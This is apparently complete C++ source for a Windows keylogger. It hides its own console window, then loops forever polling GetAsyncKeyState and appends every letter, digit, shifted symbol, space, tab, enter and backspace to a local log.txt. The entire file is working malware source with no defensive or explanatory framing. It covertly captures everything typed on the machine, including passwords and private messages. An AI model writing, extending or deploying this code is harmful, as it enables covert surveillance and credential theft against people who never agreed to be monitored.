// keystroke_logger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include<iostream>
#include <fstream>
#include <Windows.h>
#include <io.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>

// Get File Size
long file_size(std::string file_name)
{
	// create buffer for stat
	struct stat stat_buf;
	// check if stat can be successfully called with given params,
	// pass stat_buf as reference so it retains stat value of file
	int fs = stat(file_name.c_str(), &stat_buf);
	// return file size if fs was successfully called,
	// otherwise return -1
	return fs == 0 ? stat_buf.st_size : -1;

}

// Hide the console
void hideConsole() 
{
	HWND hide;
	AllocConsole();
	hide = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hide, 0);
}

//Log alphanumeric and certain format-relative keystrokes:
void keyLog();

int main() 
{
	hideConsole();
	keyLog();
	return 0;
}

void keyLog() 
{
	// Init vars
	char inp; // will hold user input as numerical value which is converted to ascii when entered into file
	bool caps_lock = false;

	while (true) {
		// we will be checking VKs 8-222 for VK input
		for (inp = 8; inp < 222; inp++) {

			if (GetAsyncKeyState(inp) & 0x0001)  // check if least siginificant bit is set so we can grab input only once key is released
			{

				// open file to store logged values, append all input at end of file
				std::ofstream file("log.txt", std::ios::app);

				//check for caps lock key pressed
				if (GetAsyncKeyState(0x14))
				{
					// caps_lock was already set, unset it
					if (caps_lock == true)
						caps_lock = false;
					else // otherwise, set it
						caps_lock = true;

				}
				// check if c is within aplha range and whether shift is being held down(to make sure input is not uppercase)
				if (!(GetAsyncKeyState(0x10)) && (inp > 64) && (inp < 91) && !caps_lock)
				{
					inp += 32; // lowercase equivalent is 32 ascii indices away
					std::cout << inp;
					file << inp; // write char to file (implicit ascii conversion)
					file.close();
					break;
				}
				// for upper case input
				else if ((inp > 64) && (inp < 91))
				{
					std::cout << inp;
					file << inp;
					file.close();
					break;
				}

				else {
					switch (inp) {
					case 48:
						if (GetAsyncKeyState(0x10)) // if shift is held, use secondary character
						{
							file << ")";
						}
						else {
							file << "0";
						}
						break;
					case 49:
						if (GetAsyncKeyState(0x10))
						{
							file << "!";
						}
						else {
							file << "1";
						}
						break;
					case 50:
						if (GetAsyncKeyState(0x10))
						{
							file << "@";
						}
						else {
							file << "2";
						}
						break;
					case 51:
						if (GetAsyncKeyState(0x10))
						{
							file << "#";
						}
						else {
							file << "3";
						}
						break;
					case 52:
						if (GetAsyncKeyState(0x10))
						{
							file << "$";
						}
						else
						{
							file << "4";
						}

						break;
					case 53:
						if (GetAsyncKeyState(0x10))
						{
							file << "%";
						}
						else {
							file << "5";
						}
						break;
					case 54:
						if (GetAsyncKeyState(0x10))
						{
							file << "^";
						}
						else {
							file << "6";
						}
						break;
					case 55:
						if (GetAsyncKeyState(0x10))
						{
							file << "&";
						}
						else {
							file << "7";
						}
						break;
					case 56:
						if (GetAsyncKeyState(0x10))
						{
							file << "*";
						}
						else {
							file << "8";
						}
						break;
					case 57:
						if (GetAsyncKeyState(0x10))
						{
							file << "(";
						}
						else {
							file << "9";
						}
						break;

						// VKs:
					case VK_SPACE /*(0x20)*/:
						file << " ";
						std::cout << " ";
						break;
					case VK_BACK /*(0x08)*/:
						// check if file_size() is successful in checking file size
						if (file_size("log.txt") != -1) {
							// create file descriptor for log.txt 
							const int file_desc = _open("log.txt", O_WRONLY);
							// prevents memory errors by only deleting as long as file_size > 0
							if (file_size("log.txt") > 0) {
								// truncate file by resizing by 1 less character
								_chsize(file_desc, (file_size("log.txt") - 1));
							}
						}
						file.close();
						break;
					case VK_RETURN:
						file << "\n";
						file.close();
						break;
					case VK_TAB:
						file << "    ";
						file.close();
						std::cout << "    ";
						break;
					} // end of switch(inp)

				} // end of else containing switch(inp)
			} // end of if(GetAsyncKeyState(c) & 0x0001)
		} // end of for() loop
	} // end of while(true) loop

}